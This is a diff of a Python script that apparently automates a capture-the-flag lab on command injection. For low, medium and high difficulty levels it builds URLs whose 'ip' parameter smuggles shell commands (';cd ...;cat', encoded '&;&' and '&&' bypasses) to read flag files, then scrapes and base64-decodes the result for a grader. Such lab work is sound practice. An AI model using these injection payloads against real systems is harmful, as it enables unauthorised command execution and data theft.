@@ -54,14 +54,20 @@ def command_injection(level):
 
     # NOTE: Remember to decode the flag before sending it to the grader.
     # grader.command_injection_verify(level, flag)
-
-    url = 'http://35.225.46.109/command_injection/low?ip=0.0.0.0;cd%20server/flags/command_injection;cat%20low.txt'
+    if level == 'low':
+        url = 'http://35.225.46.109/command_injection/low?ip=0.0.0.0;cd%20server/flags/command_injection;cat%20low.txt'
+    elif level == 'medium':
+        url = 'http://35.225.46.109/command_injection/medium?ip=0.0.0.0%26%3B%26cd%20server/flags/command_injection' \
+              '%26%3B%26cat%20medium.txt '
+    else:
+        url = 'http://35.225.46.109/command_injection/high?ip=0.0.0.0%26%26cd%20server/flags/command_injection%26' \
+              '%26cat%20high.txt '
 
     driver.get(url)
     element = driver.find_element_by_id('output')
     text = element.text
     secret = text.split('\n')[-1]
-    flag = str(base64.b64decode(secret))
+    flag = base64.b64decode(secret)
     grader.command_injection_verify(level, flag)
 
     driver.quit()
